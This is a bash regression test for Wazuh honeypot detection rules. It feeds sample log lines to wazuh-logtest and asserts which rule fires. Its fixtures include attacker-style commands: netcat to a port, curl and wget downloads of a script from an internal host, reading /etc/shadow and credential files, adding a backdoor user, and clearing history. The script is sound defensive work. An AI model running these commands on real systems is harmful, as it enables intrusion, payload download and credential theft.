#!/bin/bash
# ==============================================================================
# Rule regression test: feed canned log lines through wazuh-logtest and assert
# which rule each one lands on.
#
# The detection logic is the product here, and most of it is regex in
# local_rules.xml - the part with no compiler and no type checker. This pins the
# behaviour that was expensive to learn:
#
#   * system execs must NOT tier the box (the honeypot's own `update-rc.d` and
#     `update-alternatives --install /bin/nc` once raised SKILLED with no
#     attacker present - fixed by the 100416 attacker-context gate),
#   * the short tokens (id, nc, ps, ss) must only match in COMMAND POSITION,
#   * the true-positive path must still fire.
#
# Needs the stack up (it drives wazuh-logtest inside the manager).
#   ./bin/test_rules.sh
# ==============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."

MANAGER="${WAZUH_MANAGER_CONTAINER:-wazuh.manager}"
pass=0
fail=0

# check <expected-rule-id> <description> <log line>
check() {
    local want="$1" desc="$2" line="$3" got
    # wazuh-logtest writes its analysis to STDERR, so 2>&1 is required, not
    # optional - discarding it silently returns "no rule matched" for everything.
    got=$(printf '%s\n' "$line" \
        | docker exec -i "$MANAGER" /var/ossec/bin/wazuh-logtest 2>&1 \
        | awk -F"'" '/^[[:space:]]*id:/ {print $2}' | tail -1)
    if [ "$got" = "$want" ]; then
        printf '  ok    %-52s -> %s\n' "$desc" "$got"
        pass=$((pass + 1))
    else
        printf '  FAIL  %-52s -> got %s, want %s\n' "$desc" "${got:-<none>}" "$want"
        fail=$((fail + 1))
    fi
}

if ! docker exec "$MANAGER" test -x /var/ossec/bin/wazuh-logtest 2>/dev/null; then
    echo "[!] $MANAGER not running (or wazuh-logtest missing). Start the lab first."
    exit 1
fi

SNOOPY_SYS='snoopy: user=root uid=0 tty=(none) cwd=/ cli=(undefined) cmd='
SNOOPY_ATT='snoopy: user=root uid=0 tty=/dev/pts/0 cwd=/root cli=192.168.65.1 59647 22 cmd='

echo "== honeypot commands: the box's own activity must not classify =="
# 100410 is the level-2 base rule: seen, recorded, never escalated.
check 100410 "system exec: update-rc.d (persistence words)"   "${SNOOPY_SYS}update-rc.d dbus defaults"
check 100410 "system exec: update-alternatives (contains nc)" "${SNOOPY_SYS}update-alternatives --install /bin/nc nc /bin/nc.openbsd 50"
check 100410 "system exec: uname (recon words)"               "${SNOOPY_SYS}uname -m"
check 100410 "system exec: reads a lure (no SSH client)"      "${SNOOPY_SYS}cat /root/.ssh/id_rsa"

echo "== honeypot commands: real attacker activity must classify =="
check 100411 "attacker recon: whoami"                         "${SNOOPY_ATT}whoami"
check 100411 "attacker recon: id in command position"         "${SNOOPY_ATT}id"
check 100412 "attacker cred access: cat /etc/shadow"          "${SNOOPY_ATT}cat /etc/shadow"
check 100413 "attacker ingress: nc"                           "${SNOOPY_ATT}nc 10.0.0.9 4444"
check 100413 "attacker ingress: curl after &&"                "${SNOOPY_ATT}cd /tmp && curl -O http://10.0.0.9/x.sh"
check 100414 "attacker persistence: useradd"                  "${SNOOPY_ATT}useradd -m backdoor"
check 100415 "attacker evasion: history -c"                   "${SNOOPY_ATT}history -c"
check 100402 "TRIPWIRE: attacker reads a planted lure"        "${SNOOPY_ATT}cat /root/.ssh/id_rsa"

echo "== short tokens must not match inside arguments =="
# These are the false positives that tiered the lab. Attacker context is present,
# so only the anchoring keeps them at the base rule.
check 100416 "argument contains 'id' (JSON blob)"             "${SNOOPY_ATT}echo {\"rule\":{\"id\":\"100401\"}}"
check 100416 "argument contains '/bin/nc'"                    "${SNOOPY_ATT}ls -l /bin/nc.openbsd"

echo "== shelLM (LLM honeypot) feed =="
check 100311 "shelLM session start (no tier)" '{"honeypot":"shelLM","event":"session_start","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","time":"2026-01-01T00:00:00Z"}'
check 100312 "shelLM session start (SKILLED persona served)" '{"honeypot":"shelLM","event":"session_start","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"SKILLED","persona":"Tier_skilled","time":"2026-01-01T00:00:00Z"}'
check 100315 "shelLM recon command" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"whoami","time":"2026-01-01T00:00:00Z"}'
check 100322 "shelLM TRIPWIRE: reads a planted lure" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"SKILLED","persona":"Tier_skilled","command":"cat /root/credentials.txt","time":"2026-01-01T00:00:00Z"}'
check 100316 "shelLM credential access (non-lure secret)" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"cat /home/julie/.aws/credentials","time":"2026-01-01T00:00:00Z"}'
check 100317 "shelLM ingress: wget" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"wget http://10.0.0.9/x.sh","time":"2026-01-01T00:00:00Z"}'

echo ""
echo "passed: $pass   failed: $fail"
[ "$fail" -eq 0 ] || exit 1
